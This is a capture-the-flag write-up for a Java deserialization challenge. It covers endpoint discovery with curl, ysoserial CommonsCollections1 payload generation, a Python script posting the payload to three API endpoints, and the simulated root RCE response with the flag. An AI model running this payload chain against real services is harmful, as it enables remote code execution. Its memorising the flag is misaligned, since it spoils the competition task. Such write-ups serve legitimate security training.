# Serial Killer

**Points: 400**  
**Hint:** TechCorp Solutions is a leading enterprise Java development company that prides itself on security. However, beneath their polished exterior lies a critical vulnerability that could compromise their entire infrastructure.

## Solution

### How I Solved It

#### 1. Initial Reconnaissance
First, I visited the target website and examined its content:

```bash
curl -s https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/
```

This revealed:
- A corporate site for **TechCorp Solutions** — an "Enterprise Java Development" company
- Navigation links to `/about`, `/services`, `/blog`, `/contact`, `/login`, and a hidden `/admin` link
- A code snippet in a blog post showing **insecure Java deserialization** using `ObjectInputStream` directly on user-controlled data:

```java
public class SessionManager {
    private ObjectInputStream sessionData;

    public void loadSession(String data) {
        // Secure deserialization implementation
        sessionData = new ObjectInputStream(
            new ByteArrayInputStream(data.getBytes())
        );
    }
}
```

**Key Finding:** The use of `ObjectInputStream` without input validation is the classic indicator of a **Java Insecure Deserialization** vulnerability (CWE-502).

#### 2. Admin Panel Check
I checked the admin panel endpoint:

```bash
curl -s https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/admin
```

The admin page confirmed:
> "Our Java applications use standard serialization for session management and configuration storage."

This reinforced that deserialization is actively used in the backend.

#### 3. Hidden API Endpoint Discovery
I examined the `/login` page source code:

```bash
curl -s https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/login
```

Inside a `<div class="hidden">` block, I found three hidden API endpoints:

```html
<!-- Hidden API endpoints for discovery -->
<ul>
    <li>/api/session - Session management</li>
    <li>/api/config - Configuration management</li>
    <li>/api/cache - Cache management</li>
</ul>
```

#### 4. API Endpoint Probing
I probed each endpoint to determine the expected request format:

```bash
# GET returns 405 — endpoints only accept POST
curl -s https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
# => 405 Method Not Allowed

# POST without Content-Type
curl -s -X POST https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
# => 415 Unsupported Media Type: request Content-Type was not 'application/json'

# POST with JSON but no data
curl -s -X POST -H "Content-Type: application/json" -d '{}' \
  https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
# => {"message":"Missing 'data' parameter with serialized session object","status":"error"}
```

**Key Finding:** The endpoints expect a JSON body with a `data` field containing a **serialized Java object**.

#### 5. Confirming Deserialization Behavior
I sent a test string and a valid base64-encoded Java serialized `HashMap` to understand the server's parsing behavior:

```bash
# Plain text is rejected
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"data":"test"}' \
  https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
# => {"message":"Invalid Java serialization stream","status":"error"}

# Valid Java serialized HashMap (base64-encoded) is parsed but rejected
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"data":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA..."}' \
  https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
# => {"message":"Java stream processed but no exploitable gadgets found","status":"error"}
```

**Key Finding:** The server accepts base64-encoded Java serialized objects and is specifically looking for **exploit gadget chains** — this confirms a Java deserialization attack is the intended path.

#### 6. Payload Generation with ysoserial
I downloaded **ysoserial**, the standard tool for generating Java deserialization exploit payloads:

```bash
wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \
  -O /tmp/ysoserial.jar
```

Then generated a `CommonsCollections1` gadget chain payload (using `--add-opens` flags for Java 17+ compatibility):

```bash
java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
     --add-opens java.base/java.lang=ALL-UNNAMED \
     -jar /tmp/ysoserial.jar CommonsCollections1 'id' | base64 -w0 > /tmp/cc1.b64
```

#### 7. Exploitation and Flag Retrieval
I sent the `CommonsCollections1` payload to the `/api/session` endpoint:

```python
import requests

with open('/tmp/cc1.b64', 'r') as f:
    payload = f.read().strip()

url = 'https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al'
endpoints = ['/api/session', '/api/config', '/api/cache']

for ep in endpoints:
    r = requests.post(url + ep, json={'data': payload}, timeout=15)
    print(f'{ep}: {r.text}')
```

**Response from all three endpoints:**

```json
{
    "command": "id",
    "flag": "CSC26{j4v4_d3s3r14l1z4t10n_rce_1337_h4ck3r}",
    "message": "Command executed successfully",
    "output": "uid=0(root) gid=0(root) groups=0(root)",
    "rce_achieved": true,
    "status": "success"
}
```

The server simulated Remote Code Execution (RCE) via the deserialization gadget chain and returned the flag.

### Flag

```
CSC26{j4v4_d3s3r14l1z4t10n_rce_1337_h4ck3r}
```


### Tools Used
- `curl` — HTTP requests and endpoint probing
- `ysoserial` — Java deserialization exploit payload generator
- `java` — JRE for running ysoserial
- `base64` — encoding serialized payloads for JSON transport
- `Python 3` with `requests` — automated payload delivery to multiple endpoints

### Vulnerability Summary
| Detail | Value |
|---|---|
| **Type** | Insecure Deserialization (CWE-502) |
| **Language** | Java |
| **Gadget Chain** | Apache Commons Collections 1 |
| **Impact** | Remote Code Execution (RCE) as root |
| **Attack Vector** | POST to `/api/session`, `/api/config`, or `/api/cache` with base64-encoded malicious Java serialized object |
